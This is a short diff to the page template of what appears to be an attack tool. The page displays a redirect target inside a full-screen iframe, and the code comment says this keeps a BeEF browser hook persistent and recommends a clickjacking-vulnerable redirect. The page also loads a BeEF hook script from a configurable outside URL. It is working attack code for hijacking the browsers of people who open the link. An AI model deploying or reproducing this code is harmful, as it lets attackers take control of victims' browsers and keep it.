@@ -58,24 +58,27 @@ $conn->close();
 
 <HTML>
 <HEAD>
-
+<style>
+body {
+    margin: 0;
+}
+</style>
 </HEAD>
 <BODY>
 
-
-<script>
 <?php
-// Redirects User Instantly to Specified Location
+// Launches Redirect Location in iFRAME for Persistent BeEF Hooking.  For Best Results Use a Clickjacking Vulnerable Redirect Variable
+if($redirect != ""){
 ?>
-window.top.location.href = "<?php echo $redirect; ?>";
-</script>
+
+<iframe src="<?php echo $redirect; ?>" style="border: 0; width: 100%; height: 100%"></iframe>
 
 <?php
+}
 // Performs BEEF Hook if Set
 if($BEEFUrl != ""){?>
 <script src= "<?php echo $BEEFUrl; ?>" type="text/javascript"></script>
-<?php } ?>    
-    
+<?php } ?>
 </BODY>
 </HTML>
 
